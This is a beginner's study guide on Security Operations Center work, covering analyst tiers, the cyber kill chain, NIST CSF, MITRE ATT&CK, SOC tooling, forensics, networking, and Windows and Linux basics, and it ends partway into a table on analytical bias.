What is a SOC?

  1. 1.1

    Definition

    A Security Operations Center (SOC) is a dedicated unit or team that monitors and defends an organization's IT infrastructure. It acts as the central command post for cybersecurity, staffed by security analysts, and continuously tracks network, system, and application activity for signs of threats. A SOC combines people, processes, and technology to detect and respond to cyberattacks.

  2. 1.2

    Central Hub of Operations

    The SOC coordinates all of an organization's cybersecurity monitoring and response efforts. It's the focal point where data from various security tools and sources is collected and analyzed. The SOC team works closely with other IT and security teams, acting as the nerve center during security incidents.

  3. 1.3

    SOC Threat Detection (4 steps)
    Step 1 — Continuous monitoring

    Continuous monitoring of logs and events to identify suspicious activities or anomalies.

    Step 2 — Tool-generated alerts

    Security tools (like IDS and SIEM) generate alerts for potential threats.

    Step 3 — Analyst investigation

    Analysts investigate these alerts to determine if they indicate real security incidents.

    Step 4 — Early detection matters

    Early detection is crucial — the sooner a threat is found, the faster it can be contained.

    Step 1 of 4
  4. 1.4

    Need for a SOC
    • Incidents can occur at any time → a SOC provides 24/7 monitoring.
    • A dedicated SOC reduces time to detection → the faster a threat is detected, the faster it can be remediated.
    • Enables structured, efficient incident response.
    • Some regulations and standards require continuous monitoring → a SOC assists with compliance and auditing requirements.
    • Gives the organization confidence that its systems are protected.
02

SOC Roles & Responsibilities

  1. 2.1

    SOC Analyst Tiers

    Analysts are organized into a tiered escalation structure — Tier 1 → Tier 2 → Tier 3 — where each tier handles progressively more complex work and escalates upward when deeper expertise or privileges are needed.

  2. 2.2

    Tier 1 Analysts
    • First line of defense: continuously monitors security dashboards and alerts (e.g., SIEM alerts).
    • Performs initial triage to determine if an alert is legitimate or a false positive.
    • Resolves simple issues (false alarms, known benign events) and documents findings.
    • Escalates incidents to Tier 2 when deeper investigation or higher privileges are required.
  3. 2.3

    Tier 2 Incident Responders
    • Investigates Escalated Alerts — confirms if a security incident is occurring by analyzing Tier 1 escalated alerts.
    • In-Depth Analysis — performs comprehensive analysis to determine the scope and impact of the incident.
    • Response Actions — takes necessary response actions and starts remediation.
    • Coordination with IT Staff — collaborates with IT staff to resolve the incident and gather additional information.
  4. 2.4

    Tier 3 Threat Hunters & Forensics Experts
    • Senior security experts who handle the most complex or advanced incidents.
    • Proactively hunts for threats (potential incidents that have not yet triggered alerts).
    • Performs deep forensic analysis to determine the root cause of an attack.
    • Improves the SOC's detection abilities: develops new use cases, tunes security controls, and mentors junior analysts.
  5. 2.5

    Additional Roles / Functions
    • Threat Intelligence Analyst — focuses on external threat data (e.g., new hacker tactics, indicators of compromise) to inform the SOC team.
    • SOC Engineer / Architect — manages and fine-tunes the security tools (SIEM, IDS, etc.) and infrastructure the SOC relies on.
    • Incident Coordinator — in some SOCs, a role dedicated to managing communication and workflow during major incidents.
    • Larger organizations may also have dedicated malware analysts, compliance specialists, or other support roles.
  6. 2.6

    SOC Manager
    • Leads the SOC team, ensuring 24/7 coverage and that procedures are followed correctly.
    • Oversees incident handling and provides guidance or approval for significant response actions.
    • Tracks security metrics and reports on the SOC's performance.
    • Responsible for staffing, training, and continual improvement of SOC operations and technologies.
03

SOC Operations

  1. 3.1

    SOC Tiers (organizational pyramid, top to bottom)
    1. SOC Manager
    2. Tier 3 Analysts — Incident Response & Threat Hunting
    3. Tier 2 Analysts — Incident Responders
    4. Tier 1 Analysts — broadest base, largest group, first-line triage
  2. 3.2

    On-site SOC
    • Larger organizations often have an in-house SOC facility.
    • Sensitive data and incident details stay within the organization's control.
    • The SOC team can be intimately familiar with the organization's systems.
    • Direct communication lines exist to other departments (IT, legal, management).
  3. 3.3

    In-House vs. Outsourced
    • In-house — operated by the organization's own employees.
    • Outsourced (MSSP) — a Managed Security Service Provider offers SOC services remotely.
    • Many organizations use a hybrid solution combining both.
    • Organizations with highly sensitive or classified data often prefer in-house.
  4. 3.4

    24/7 SOC Operations
    • Threats don't follow business hours.
    • Analysts rotate through shifts.
    • There is a structured handover process between shifts.
    • 24/7 monitoring is crucial for detecting attacks at their earliest stages.
  5. 3.5

    Global SOC / Follow-the-Sun
    • Global monitoring is vital for organizations with a worldwide presence.
    • Multinational organizations often operate multiple SOCs across different regions for global coverage.
    • The "follow-the-sun" approach passes incident / monitoring responsibility to whichever regional SOC is in daytime hours.
    • A central SOC may coordinate with regional SOCs, sharing information across the globe.
04

Cyber Kill Chain (Lockheed Martin — 7 stages)

Stage 1 — Reconnaissance

The attacker gathers information about the target, using passive and active methods: internet searches, email harvesting, network scans.

Stage 2 — Weaponization

The attacker creates a deliverable payload, which may include a remote access tool (RAT) or other backdoor, encryption tools, or another malware downloader.

Stage 3 — Delivery

The malicious payload is sent to the victim via email, a watering-hole attack (malicious website), a drive-by download, or a malicious USB drive.

Stage 4 — Exploitation

The payload is run on the victim's system (e.g., opening an email attachment or visiting a malicious website where malware downloads / runs). The attacker may exploit other vulnerabilities, and this can be a multi-step process where the original payload downloads additional malware.

Stage 5 — Installation

Additional tools are installed via the original RAT / backdoor: encryption software, more complex malware, command-and-control software, exfiltration tools — essentially any tools the attacker needs to carry out the objective.

Stage 6 — Command & Control (C2)

The victim machine connects to attacker-controlled infrastructure, possibly using well-known ports to evade detection, with traffic that may be encrypted. This connection allows additional commands and malware to be run, letting the attacker further customize the attack to the victim's environment.

Stage 7 — Actions on Objectives

The attacker accomplishes their original goals based on all previous steps: encryption and ransom demand, data theft (and possible ransom), destruction of data or systems, software disruption, or establishing persistent access for further goals.

Stage 1 of 7

NIST Cybersecurity Framework

  1. 5.1

    Definition

    NIST (National Institute of Standards and Technology) is part of the U.S. Department of Commerce. It develops standards, guidelines, and frameworks, and created and maintains the Cybersecurity Framework (CSF). The CSF provides a structure and common language for managing cybersecurity risk, is designed to help organizations understand their current and needed cybersecurity programs, and aligns cybersecurity with business goals. It is used by organizations worldwide — not just in the U.S.

  2. 5.2

    The Five Core Functions
    IdentifyUnderstand assets, systems, and risks
    ProtectImplement access control, data security, and endpoint protection
    DetectMonitor, detect anomalies, and identify threats
    RespondContain, eradicate, and mitigate incidents
    RecoverRestore operations, capture lessons learned, and drive continuous improvement
  3. 5.3

    In Practice (phishing example)
    • A potentially malicious email is delivered to a mailbox → Detect (through user report, mailbox monitoring, etc.).
    • An analyst investigates the alert and escalates it for remediation → Respond.
    • Indicators are collected from the email and added to filters → Identify and Protect.
    • The organization updates user training → Recover.
    • Understanding this framework helps analysts see the whole picture beyond just individual alerts — improving communication and tying metrics into organizational goals.
06

MITRE ATT&CK

  1. 6.1

    Definition

    ATT&CK stands for Adversarial Tactics, Techniques, & Common Knowledge — described as a "knowledge base of adversary tactics and techniques based on real-world observations."

  2. 6.2

    ATT&CK Matrix for Enterprise
    • Columns represent tactics, which contain individual techniques.
    • There are over 230 documented techniques.
    • Each technique entry includes an explanation, procedure examples, mitigation guidance, and detection guidance.
    • Maintained at attack.mitre.org.
  3. 6.3

    Technique example — Phishing (T1566)

    Adversaries send phishing messages to gain access to victim systems. All phishing is a form of electronically-delivered social engineering. It can be targeted at a specific individual / company / industry (spearphishing) or non-targeted, as in mass malware spam campaigns. Victims may receive malicious attachments or links, sometimes via third-party services like social media. Attackers may forge or spoof the sender's identity, manipulate email headers, or insert malicious content into an existing email thread ("thread hijacking"). Phishing may also direct victims to call a phone number that leads to a malicious URL, malware download, or an adversary-accessible remote management tool.

  4. 6.4

    Importance for SOC Analysts
    • Helps analysts understand the "why" behind alerts — giving context to what may be happening.
    • Gives analysts the ability to clearly communicate findings, since ATT&CK's terms and IDs are standardized and commonly used across SOCs.
    • Helps connect individual alerts to the attacker's broader goals — understanding the full attack chain, not just isolated alerts.
    • Considered required knowledge for advancement to Tier 2 or Threat Hunter roles.
07

SOC Tools & Terminology

  1. 7.1

    SOC Tools & Technology
    • SIEM — aggregates logs and alerts, enabling correlation and centralized monitoring.
    • Network Security Tools — firewalls, IDS / IPS, covering the network perimeter and internal traffic.
    • Endpoint Security Tools — antivirus and EDR (Endpoint Detection and Response) agents on endpoints.
    • Also: vulnerability scanners, threat intelligence feeds, and case management systems.
  2. 7.2

    Monitoring Data Sources
    • Network Logs — firewall, router, and switch logs, giving insight into traffic patterns and potential intrusions.
    • System Logs — OS and server application logs (login events, file access, errors) that help detect suspicious behavior on hosts.
    • Endpoint Reports — alerts from antivirus / EDR software about malware or unusual activity on workstations and servers.
    • Cloud Service Logs — monitoring data from cloud platforms for unauthorized access or configuration issues.
    • All of these sources feed into SOC tools (the SIEM) for centralized analysis.
  3. 7.3

    SIEM (Security Information and Event Management)
    • The core platform of the SOC — it collects logs and events from across the organization.
    • Correlates data to highlight suspicious patterns.
    • Analysts use the SIEM dashboard to get an overview of security alerts and analyze log details during an investigation.
    • Can generate reports and metrics, and can serve as a central console for incident tracking.
  4. 7.4

    Network Security Monitoring (IDS / IPS)
    • IDS (Intrusion Detection Systems) monitor network traffic for known threat signatures or unusual patterns and alert the SOC of potential intrusions.
    • IPS (Intrusion Prevention Systems) go a step further by actively blocking suspicious traffic in real time.
    • These tools can detect things like port scans, exploit attempts, or malicious payloads traveling over the network.
    • SOC analysts investigate IDS / IPS alerts to verify attacks and adjust rules — reducing false positives while staying vigilant for new threats.
  5. 7.5

    Threat Intelligence
    • SOC tools often integrate threat intel feeds — known malicious IPs, hashes, domains, etc. — which help with detecting known threats.
    • Analysts use threat intel to enrich alerts (e.g., recognizing that an IP flagged in an alert is on a known malicious list).
    • Using threat intel, a SOC can proactively adjust defenses and prioritize alerts based on current threat trends.
  6. 7.6

    Incident Tracking & Collaboration
    • SOCs use ticketing or case management systems to document each incident from detection through resolution.
    • These tools ensure smooth hand-offs between shifts or team members, with all investigation notes recorded in one place.
    • Collaboration platforms are used during incidents to keep everyone synchronized.
    • Detailed tracking and communication help prevent things from falling through the cracks, especially during complex or long-running incidents.

Introduction to DFIR

  1. 8.1

    Digital Forensics — definition
    • The identification, collection, examination, and analysis of data (evidence).
    • Data can come from any type of device.
    • Frequently used for legal purposes (in a court of law).
    • Requires preservation of evidence integrity through a strict chain of custody.
    • Often included in incident response activities — hence the term DFIR (Digital Forensics and Incident Response).
    • Attribution — identifying the origin or source of an attack — can be very difficult to accomplish during an investigation.
  2. 8.2

    Chain of Custody

    Documentation of evidence collection from the moment a forensics investigation begins until the evidence is presented in court. It must document:

    • How the evidence was collected
    • When it was collected
    • How it was transported
    • How it was tracked
    • How it was stored
    • Who had access to it
    • How it was accessed
  3. 8.3

    Digital Forensics in the SOC
    • Forensic analysis involves collecting and examining digital evidence from computers, servers, or networks after an incident.
    • SOC analysts may retrieve disk images, memory dumps, or log files from affected systems to investigate what happened.
    • Forensics can reveal the attack timeline, the methods used by the attacker, and exactly what data or systems were impacted.
    • The findings help fully understand the incident and can be used to strengthen defenses or support legal proceedings if needed.

SOC Maturity Levels

  1. 9.1

    Why Maturity Matters
    • Maturity models are methods used to define a SOC's capability, effectiveness, and operational maturity.
    • SOC capabilities evolve based on security needs, available resources, and risk tolerance.
    • Ensures scalability and adaptability to evolving cyber threats.
    • Reduces incident response time and enhances detection capabilities.
    • Aligns SOC operations with industry best practices and compliance standards.
    • Helps organizations measure progress and identify gaps in their security operations.
    • Important to understand even as a Tier 1 Analyst.
  2. 9.2

    The 5 Maturity Levels
    Level Name Description
    Level 1 Minimal (Ad-hoc) No formal SOC. No 24/7 monitoring; security is reactive.
    Level 2 Developing (Reactive) Basic SOC. Monitoring exists but lacks automation or proactive measures; mostly manual processes.
    Level 3 Defined (Operational) Established SOC. Incidents are detected, triaged, and handled systematically.
    Level 4 Managed (Proactive) Advanced SOC. Incorporates threat intel, analytics, automation, and threat hunting.
    Level 5 Optimized (Intel-driven) Fully integrated & automated SOC. Uses AI / ML-driven detection and automated responses.

01

Security Foundations

  1. 1.1

    What is Information Security?

    InfoSec = protecting information from unauthorized access, use, disclosure, disruption, modification, or destruction. Applies to data, systems, networks, people, and processes.

    Why organizations need it: increasing threat sophistication; protecting sensitive data (financial, personal, IP); legal / compliance / regulatory requirements; operational continuity and reputation.

    InfoSec in practice spans 5 functional areas:

    • Governance, Risk & Compliance
    • Preventative & Technical Controls
    • Monitoring & Detection
    • Training & Awareness
    • Incident Response & Recovery

    Role of SOC analysts: monitor systems for attack signs, investigate alerts / suspicious events, escalate when needed, and help ensure confidentiality, integrity & availability (CIA).

  2. 1.2

    Defense in Depth

    Security is layered, not a single tool — if one layer fails to detect or stop a threat, others still can. Core layers (top to bottom):

    • Physical
    • Perimeter
    • Network
    • Endpoint
    • Application
    • Data
    • Identity
    • Monitoring & Response

    Limited Access principles:

    • Least privilege — grant only the minimum access needed for a role; applies to all users and application requirements (no unnecessary root / admin).
    • Separation of duties — no single person performs all critical / privileged duties; prevents one malicious insider from causing severe damage (e.g., auditors shouldn't have modify access).

    Why it matters to a SOC analyst: attacks bypass individual controls; each layer creates detection opportunities; alerts from different layers add context; failures at one layer should be caught by another.

  3. 1.3

    Common Threats and Attacks

    Threat vs. Attack: a threat is a potential cause of harm that exploits a vulnerability (possibility); an attack is a deliberate action aimed at compromising systems / data (execution). SOC analysts detect, analyze, and respond to attacks arising from threats.

    Threat categories:

    • Malware — ransomware, trojans, worms.
    • Social engineering — phishing, vishing (voice phishing), pretexting.
    • Insider threats — data theft by disgruntled employees, mishandling sensitive information.
    • Misconfigurations / poor hygiene — exposed cloud storage, unpatched systems, weak / reused passwords.
    • Supply chain — malicious updates, dependency poisoning.

    Threat actors: nation-state, hacktivists, unskilled attackers, organized crime.

    Why SOC analysts need this: identify patterns during triage, prioritize high-risk events, understand attacker behavior across the kill chain, improve response recommendations.

    Worked examples from the deck (log → SIEM alert → recommended action pattern):

    • Credential attack (password spraying): repeated failed logins across different accounts from one source IP, followed by a successful login → SIEM flags password spraying → recommended actions: disable / lock the compromised account, investigate post-login activity, review MFA logs, block the source IP, notify IR.
    • Malware delivery & execution: a process launches from a temp folder → creates a DLL → makes an outbound connection to a suspicious IP → SIEM flags malware execution / possible C2 → recommended actions: isolate the host, collect memory / disk artifacts, run a full EDR scan, investigate user / auth logs.
    • Denial of Service (DoS): an attack designed to disrupt systems by consuming bandwidth / resources.
  4. 1.4

    Risk Concepts

    Risk = the potential for loss or harm when a threat exploits a vulnerability.

    • Threat — anything capable of causing harm.
    • Vulnerability — a weakness that could be exploited.
    • Asset — anything of value that must be protected.
    • Impact — the result of an event (data loss, outage, financial damage).
    • Likelihood — how probable an event is.

    Why it matters to SOC analysts: every alert represents potential or actual risk; SOC decisions affect how the org detects, classifies, and mitigates risk; understanding risk improves triage accuracy. Analysts must identify risky behaviors, recognize high-risk patterns (admin compromise, lateral movement), prioritize by impact, and escalate unacceptable risk.

  5. 1.5

    Security Controls

    A security control is a safeguard or countermeasure designed to reduce risk by preventing, detecting, or responding to threats.

    Control categories:

    • Technical — implemented as a system (hardware / software / firmware): firewalls, AV / EDR, OS security settings, encryption, IPS, ACLs.
    • Operational — implemented primarily by a person, not a system: security guards, training programs. (Operational + Managerial together = "Administrative Controls.")
    • Managerial — provide oversight / management of security programs, often describing requirements for other control categories: risk assessment programs, security policies (e.g., Acceptable Use Policy).
    • Physical — secure defined structures / areas: alarms, locked doors, CCTV, lighting, ID badges, biometric locks.

    Control types:

    • Preventive — reduces likelihood of a successful attack, acts before it happens (ACLs, AV / EDR).
    • Deterrent — discourages an attempt without necessarily preventing access ("No trespassing" signs, legal disclaimers).
    • Detective — identifies and logs attempted / successful attacks (logging systems).
    • Corrective — reduces / eliminates impact after an attack (backups, patching).
    • Compensating — a substitute control providing equal or better protection via a different tech / method.
    • Directive — monitors regulatory compliance, guides org-specific requirements.

Networking Fundamentals

  1. 2.1

    Network Models (OSI & TCP/IP)

    OSI 7 layers (top to bottom), with typical protocols:

    #LayerFunctionExamples
    7ApplicationUser-facing servicesHTTP, DNS, SMTP
    6PresentationTranslation, encryption, compressionASCII / UTF-8
    5SessionManages sessions / connections between appsNetBIOS, RPC, SMB
    4TransportEnd-to-end communication, flow controlTCP, UDP
    3NetworkLogical addressing and routingIP, ICMP, IPSec
    2Data LinkFraming, physical addressing, error detectionEthernet, PPP, switches
    1PhysicalThe physical connection mediumUSB, cabling, hubs

    TCP/IP 4-layer model: Application (HTTP/HTTPS, DNS, SMTP, FTP) → Transport (TCP = reliable, UDP = fast / connectionless) → Internet (IPv4, IPv6, ICMP) → Network Access (Ethernet, Wi-Fi, MAC addresses).

    Why it matters to a SOC analyst: faster / more accurate triage (know where to look); clearer escalation communication using shared terminology; efficient use of the right logs / tools per layer; accurate incident classification / ticketing; stronger threat-detection context (mapping activity to layers helps place it in the kill chain); fewer false positives.

  2. 2.2

    Fundamentals of IP Addressing

    IPv4 is a 32-bit logical address in 4 octets (dotted-decimal, e.g., 192.168.1.10). An IP identifies which local network a device is on and a unique host on that network; can be static (fixed devices) or dynamic (mobile / laptop).

    "Local" vs. "remote": a host checks whether the destination is on its own local network — if local, it sends directly over the switch; if remote, it forwards the message to a router, which determines the best route toward the destination.

    Why it matters to a SOC analyst: IP is part of nearly every packet analyzed; it's the first identifier of a host and shows whether an endpoint is local or remote. Common indicators of attack include unusual destination IPs, unusual traffic volume from an IP, and known-malicious IPs.

  3. 2.3

    IPv4 Addressing

    Public vs. Private:

    • Private (RFC 1918, internal use only):
      • Class A: 10.0.0.0 – 10.255.255.255
      • Class B: 172.16.0.0 – 172.31.255.255
      • Class C: 192.168.0.0 – 192.168.255.255
    • Public — globally unique, purchased, used at the internet edge; everything outside the RFC 1918 ranges.

    NAT (Network Address Translation) lets many private-address devices share a small number of public addresses (there are only ~4.3 billion public IPv4 addresses vs. tens of billions of connected devices).

    CIDR (Classless Inter-Domain Routing): replaced rigid classful addressing; the network / host boundary can sit anywhere in the 32-bit address, marked by a subnet mask (written in "slash" notation, e.g., /22). A 1-bit in the mask = network portion; a 0-bit = host portion.

    Key mask values to memorize: 128, 192, 224, 240, 248, 252, 254, 255 (binary 10000000 → 11111111).

    CIDR example: 10.10.192.0/18 (mask 255.255.192.0) with IP 10.10.194.6 → resolves to network 10.10.192.0.

  4. 2.4

    IPv6 Addressing

    Created in 1998 because IPv4's address space would eventually be exhausted. 128-bit addressing, expressed in hexadecimal, 8 groups of 4 hex characters ("words") separated by colons — e.g., 2001:00BC:0000:0000:0000:0001:1230:000A.

    Abbreviation rules: leading zeros in a word can be dropped; one run of consecutive all-zero words can be collapsed to ::; only one :: is allowed per address (e.g., 2001::33:0:1:0:A/64 is valid; a second :: is not).

    Address types:

    TypePrefixScopeRoutable on Internet
    Link-LocalFE80::/10Local onlyNo
    Unique Local (ULA)FC00::/7 (FD00::/8)InternalNo
    Global Unicast2000::/3RemoteYes

    Link-local addresses assign automatically (like IPv4's 169.254.x.x) and embed the device's MAC address (with "FFFE" inserted) in the last 64 bits.

  5. 2.5

    Common Protocols and Port Numbers

    A port tells the receiving system which upper-layer application should handle the traffic (e.g., HTTP = TCP 80).

    Common TCP ports: FTP 20/21, SSH/SFTP 22, Telnet 23, SMTP 25, HTTP 80, LDAP 389, HTTPS 443, SMB 445, SMTPS 587, LDAPS 636, SQL Server 1433, RDP 3389.

    Common UDP ports: DNS 53, DHCP 67/68, TFTP 69, NTP 123, SNMP 161/162, Syslog 514, SIP 5060/5061.

  6. 2.6

    Network Devices and Their Security Roles
    • Switches (Layer 2): port security, VLANs, 802.1x authentication; monitored for ARP / MAC table changes.
    • Routers: separate internal / external networks; enforce simple ACLs; feed logging tools with traffic data.
    • Firewalls: enforce policy between network segments (e.g., separating a web / email DMZ from internal Sales / Finance subnets).
    • IDS / IPS: monitor traffic for malicious patterns. IDS alerts; IPS blocks inline. Security role: generate high-value SOC alerts, provide exploitation-attempt visibility, block malicious activity (IPS only).
    • Proxy servers (forward / reverse): intermediaries between users and the internet; enforce acceptable-use policy, log web traffic, filter malware / phishing.
    • Network monitoring & logging devices: TAPs (dedicated hardware), SPAN ports (built into switches), packet brokers / collectors — feed raw packet / flow data into IDS / SIEM / forensic tools.

Windows Fundamentals

  1. 3.1

    Windows Architecture and Components

    Windows runs in two privilege rings:

    • User Mode (Ring 3) — applications, user-mode drivers, the Windows API.
    • Kernel Mode (Ring 0) — the OS kernel, other kernel-mode drivers, file-system drivers.

    Sitting above the Hardware Abstraction Layer and hardware.

    Services are background programs that handle system functions (printing, updates); startup types include automatic (at boot), manual (on demand), and disabled; they run with elevated privileges and are essential to OS operation.

    GUI vs. CLI: GUI (windows / icons / menus / pointer) is intuitive for everyday tasks; CLI (Command Prompt / PowerShell) is text-based, preferred for automation and advanced / scripted tasks.

  2. 3.2

    Windows Desktop, Registry & Security Features

    Desktop / Start Menu / Taskbar: the Desktop is the workspace after login; the Start Menu lists installed programs and provides search; the Taskbar shows open windows plus the system tray (clock, volume, network) and Start button.

    Windows Registry — a hierarchical database of system-wide and user-specific configuration settings; changes affect application behavior, startup, drivers, and more.

    Built-in security features: Windows Defender Antivirus, Windows Firewall, Windows Update, BitLocker (disk encryption).

  3. 3.3

    Key Windows System Locations and Files

    Drive letters & paths: each volume gets a letter (C: is usually the system drive). Absolute path example: C:\Users\Ahmed\Documents\Report.docx; relative path: Folder\File.txt; network (UNC) paths: \\ServerName\ShareName\Folder.

    Core system executables (all in C:\Windows\System32\):

    FilePurpose
    ntoskrnl.exeWindows kernel — memory, processes, drivers
    winload.exeBoot loader that loads the kernel
    winresume.exeResumes Windows from hibernation
    smss.exeSession Manager — first user-mode process created by the kernel
    csrss.exeClient / Server Runtime — console and thread creation
    winlogon.exeManages logon, Ctrl+Alt+Del, security policies
    services.exeSystem Service Control Manager
    lsass.exeLocal Security Authority — authentication, AD integrity (a high-value malware target)

    Other key locations: C:\Windows\System32\drivers\ holds kernel driver .sys files (rootkits commonly hide here); System32 / SysWOW64 hold system DLLs (kernel32.dll, ntdll.dll, advapi32.dll, user32.dll); the hosts file is C:\Windows\System32\drivers\etc\hosts.

    Registry hives: SYSTEM (drivers / services config), SOFTWARE (installed programs / settings), SAM (local account DB and password hashes), SECURITY (local security policies), DEFAULT (default user profile).

  4. 3.4

    Fundamental Windows Management Tools
    • Task Manager (Ctrl+Shift+Esc) — CPU / memory usage per process, performance graphs, startup-program control, ending unresponsive processes.
    • Settings vs. Control Panel — Settings is the modern unified interface; Control Panel remains for legacy / advanced items (Device Manager, some account settings).
    • services.msc — start / stop / restart services; set Automatic (Delayed Start) to improve boot performance.
  5. 3.5

    Event Viewer and Windows Security Logs

    Event Viewer logs major system / application events. Key categories:

    • System — hardware / driver events.
    • Application — software logs.
    • Security — logon events.

    Use filters to search for critical errors, warnings, or specific Event IDs.

  6. 3.6

    Windows User and Permissions Basics

    Account types: Administrator (full system access — use only when necessary), Standard (limited, everyday tasks; needs UAC approval for changes), Guest (very limited, temporary, disabled by default on modern Windows). Least-privilege practice: do daily work as Standard, elevate only when required.

    Managing accounts: create / delete via Settings > Accounts (deleting can keep or remove the user's files); change account type (Standard ↔ Administrator) to grant / revoke elevated rights; each account has a profile folder under C:\Users\<username>.

    Password & lockout policy: strong passwords (8+ chars, mixed types); password expiration policies (e.g., every 90 days); account lockout after N failed attempts thwarts brute force; enterprise environments often add MFA.

    Permissions fundamentals: a resource has an Access Control List (ACL) that maps users / groups to permissions; grouping users simplifies permission management at scale.

  7. 3.7

    Active Directory Basics
    • Local identity / access management — each server independently authenticates users and owns its own resources.
    • Active Directory (centralized) — a domain-level Active Directory server centrally authenticates users across multiple servers / resources, replacing per-server local accounts with one managed identity system.
  8. 3.8

    Windows Command Line Essentials

    Command Prompt (CMD) — the original CLI, good for simple text commands / batch scripts (file management, ping, etc.). PowerShell — a more advanced, object-based scripting environment using cmdlets (verb-noun convention, e.g., Get-Process, Set-Item), with .NET integration; widely used for administration and bulk / automated tasks. Some commands require "Run as administrator."

    Basic CMD commands: dir (list directory contents), cd (change directory), copy, move.

    PowerShell essentials: Get-Command / Get-Help <cmdlet> to discover / read documentation; cmdlets return objects that can be piped into other cmdlets. Pipelines use | to pass output from one cmdlet to another — e.g., Get-Process | Where-Object {$_.CPU -gt 100} filters processes using more than 100 CPU units.

04

Linux Fundamentals

  1. 4.1

    Linux Architecture

    Linux is an open-source, Unix-like OS bridging hardware and applications; known for stability / security; runs servers, desktops, Android, and embedded systems. It's free / open-source software (FOSS) under licenses like the GPL — source code is public, and a global community collaboratively develops it (often called "GNU/Linux" since the kernel commonly pairs with GNU tools).

    Distributions (distros) are packaged versions of Linux; hundreds exist for different needs, but all share the same kernel core.

    Architecture layers (bottom to top): Hardware → Kernel → System Libraries & Utilities → Shell → User Applications.

    Shells: sh (basic, UNIX-compatible, often runs scripts via /bin/sh), bash (most common, e.g. Ubuntu), zsh (bash-like with more features, default on most macOS). A GUI runs on top of the shell (display server, desktop environment, window manager, GUI apps).

    Package management: distros use different package managers to install / update / remove software — e.g., sudo apt update && sudo apt install nmap (Debian / Ubuntu) or sudo yum install nano (RHEL-family).

    Linux in cybersecurity: many security tools (network analyzers, pentest suites, forensic tools) are Linux-based; security-focused distros (Kali, Parrot OS) come pre-loaded with them; Linux commonly powers servers, firewalls, and security appliances, and can be hardened (e.g., SELinux).

  2. 4.2

    Linux Users, Groups, and File Permissions

    Linux is multi-user: each account (or service) has a user (username + unique UID); the root user has full administrative control; regular users have limited privileges. A group is a collection of users used to share access rights; every file is owned by a user and a group.

    Permissions apply to three categories — owner, group, others — with three types: read (r), write (w), execute (x). Example: -rwxr-x--x means the owner has full rwx, the group has r-x, and others have only x.

    Changing permissions / ownership:

    • chmod — change permissions (symbolic: chmod u+x script.sh; octal: chmod 755 script.sh).
    • chown — change owner (and optionally group): chown alice:developers project/.
    • chgrp — change group ownership only.

    Only the file's owner or root can change permissions / ownership; regular users need sudo.

    sudo ("superuser do") lets a permitted user run a command as root (or another user) as defined by policy; prompts for the user's own password, is logged for auditing, and avoids sharing the actual root password.

  3. 4.3

    Linux Processes & Services

    Process tools: ps aux (list all running processes), top (live continuously-updating view), jobs / fg %1 / bg %1 (manage background jobs), kill (send a signal to terminate a process by PID).

    Services / daemons: daemons are background services that run continuously; systemd (PID 1) is the modern init system; systemctl is the command to interact with it; older systems without systemd use init scripts and the service command.

    Why it matters to a SOC analyst: processes show what's running right now; services show what's designed to run automatically. Both are key to detecting malware, persistence, unauthorized access, and misconfigurations — "if you can't explain what a process or service is doing, you can't tell whether it's legitimate or malicious."

  4. 4.4

    Linux Networking and Remote Access

    Basic networking tools: ip / ifconfig (interfaces / addresses), ping (connectivity), netstat / ss (sockets / connections), traceroute (path to a destination).

    SSH (Secure Shell) — the standard protocol for secure remote login (ssh <user>@<hostname>, default port 22), encrypting the session. Key-based authentication (public / private key pairs) is preferred over passwords for better security. SSH also enables secure file transfer (scp / sftp) and tunneling.

  5. 4.5

    Linux Command Line Essentials

    The shell is the command-line interpreter; bash is the most common default. Type a command, press Enter, output / errors print to the terminal. CLI gives powerful control without a GUI — essential for servers and scripting.

    Syntax & help: general form is <command> [options] [arguments] (e.g., ls -l /etc); most commands support --help / -h; man <command> opens the manual page; Tab-completion auto-completes commands / filenames.

    File paths & navigation: absolute path (/etc/hosts) vs. relative path (Documents/data.csv); special notations: . (current), .. (parent), ~ (home); pwd prints the current working directory.

    Common shell commands: ls (list contents), cd (change directory), find (find files), cat (view file contents), cp (copy), rm (remove), mv (move / rename).

    Redirection & piping: > writes output to a file (overwrite), >> appends, < reads input from a file, | pipes one command's output into another (e.g., ps aux | grep ssh).

    Linux ↔ Windows command equivalents: dir ≈ ls; copy ≈ cp; move ≈ mv; del ≈ rm; ipconfig ≈ ifconfig / ip addr; netstat works similarly on both.

05

Analyst Mindset & Tradecraft

  1. 5.1

    Thinking Like an Analyst

    Approaching problems with a curious, investigative mindset; using evidence-based reasoning instead of assumptions; understanding that alerts are symptoms, not conclusions; identifying patterns / anomalies / relationships in data.

    Key traits:

    • Curiosity ("why? what else could this mean?")
    • Skepticism — don't take data at face value.
    • Attention to Detail — small clues lead to big findings.
    • Persistence — follow evidence even when tedious.
    • Objectivity — avoid bias / assumptions.

    Basic analytical process: Observe → Question → Hypothesize → Investigate → Conclude & Act.

    Using context — the 4 questions that turn raw data into insight:

    • Who? — a regular user? admin? service account?
    • Where? — internal? external? a sensitive system?
    • When? — business hours or unusual time?
    • What? — is this normal behavior for this user / system?

    Example: "login from a new location" is low risk (VPN, traveling user) or high risk (account-takeover indicator) — context decides which.

    Thinking in attack stages (Cyber Kill Chain, Lockheed Martin): Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives.

    Correlating data: don't rely on one log source — combine firewall events, endpoint alerts, authentication logs, and threat intelligence to identify multi-stage attacks and separate true from false positives; only investigate "as deep as needed."

  2. 5.2

    Pattern Recognition

    Analysts look for known attack behaviors vs. unusual activity, across three pattern types:

    • Behavioral — repeated failed logins, consistent odd-hour remote access, unusual PowerShell usage.
    • Technical — known malware behaviors, common attacker TTPs (MITRE ATT&CK), repeated scanning ports / IPs.
    • Temporal — events at the same time every night, activity spikes on weekends / holidays.

    Techniques: deliberate comparison, chunking, hypothesis-driven thinking, slow-then-fast thinking. Practice exercises: "what's normal?" baselining, unlabeled log review, reverse analysis, daily review of one phishing + one malware report.

    Real-world example (worked in the deck): two login sessions for the same user compared side-by-side — one during normal business hours with a familiar pattern, one late at night with more failed attempts, a new IP, and a second successful login from a different IP minutes later — illustrating how identical-looking "successful login + MFA approved" events differ sharply once time, IP behavior, and follow-on activity are compared.

  3. 5.3

    Avoiding Analytical Bias

    Bias = "systematic errors in judgment rooted in mental shortcuts or heuristics" (MITRE CTI Handbook). Since analysts work with incomplete / ambiguous data, bias can cause wrong severity assignment, incorrect escalation, dismissed real threats, or chased false leads.

    Four common biases:

    BiasDefinitionExampleCountermeasure
